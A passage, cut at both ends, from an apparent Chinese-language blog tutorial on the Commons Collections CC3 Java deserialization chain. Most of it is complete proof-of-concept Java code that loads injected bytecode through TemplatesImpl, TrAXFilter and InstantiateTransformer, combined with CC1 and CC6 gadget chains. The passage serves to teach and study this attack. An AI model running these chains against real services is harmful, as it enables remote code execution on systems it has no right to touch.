alt="cc308"></p><p>后面就很好理解了：现在调<code>newTransformer()</code>这条路走得通，而且<code>newTransformer()</code>还是个<code>public</code>方法。这里可以利用<code>CC1</code>那边的<code>chainedTransformer</code>替换：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1TemplatesEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">// templates.newTransformer();  </span><br>  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> chainedTransformer.transform(<span class="hljs-number">1</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>transform</code>里面的参数无所谓，因为存在<code>new ConstantTransformer(templates)</code>。说白了就是<code>templates.newTransformer()</code>，换别的方法罢了。</p><p>这条路既然能走通，可以尝试把<code>CC1</code>剩下的部分都放进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1TemplatesEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">// templates.newTransformer();  </span><br>  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//   chainedTransformer.transform(1);  </span><br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;drunkbaby&quot;</span>);  <br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  <br> <span class="hljs-comment">// 序列化反序列化  </span><br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><code>ysoser</code>版CC3:</p><p>上面分析了，只要实现调用<code>templates.newTransformer()</code>就能进行命令执行，直接找都哪里调用了这个方法(这里我就直接去看<code>TrAXFilter</code>了，具体原因参考<a href="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/#1-CC3-%E9%93%BE%E5%88%86%E6%9E%90">参考文章</a>)：</p><p><img src="/img/TrAXFilterCode.png" alt="TrAXFilterCode"></p><p>注意构造函数中的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">_templates = templates;<br>_transformer = (TransformerImpl) templates.newTransformer();<br></code></pre></td></tr></table></figure><p>所以只要调了这个构造函数就能达到目标</p><p>有没有哪个地方调了这个构造函数？</p><p><code>InstantiateTransformer</code>下存在：</p><p><img src="/img/InstantiateTransformer.png" alt="InstantiateTransformer"></p><p>可以通过<code>transform</code>调用指定构造器并放入指定参数，看下这个参数怎么定义的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InstantiateTransformer</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> &#123;<br>    <span class="hljs-built_in">super</span>();<br>    iParamTypes = paramTypes;<br>    iArgs = args;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以现在的逻辑：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">需要实现：templates.newTransformer<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span><br>TrAXFilter的构造函数调用了templates.newTransformer<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span><br>InstantiateTransformer.transform可以进行构造方法调用<br>(所以这里又回到了transform方法的调用)<br></code></pre></td></tr></table></figure><p>这里传入 <code>new Class[]&#123;Templates.class&#125;</code> 与 <code>new Object[]&#123;templates&#125;</code> 即可。</p><p>这里我们把前面的<code>templates.newTransformer()</code>替换：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> instantiateTransformer.transform(TrAXFilter.class);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/cc307.png" alt="cc307"></p><p>这里可以看到最终回到了<code>transform</code>方法的调用。。直接把他和<code>CC1</code>的拼一下：</p><p>其实就是把<code> instantiateTransformer.transform(TrAXFilter.class);</code>换掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// CC3 链最终 EXPpublic class CC3FinalEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception  <br>    &#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,   <span class="hljs-comment">//注意这里</span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  <br>  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  <br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  <br>  <br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>当然也能和<code>CC6结合</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// 用 CC6 链的前半部分链子  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3FinalEXP2</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// 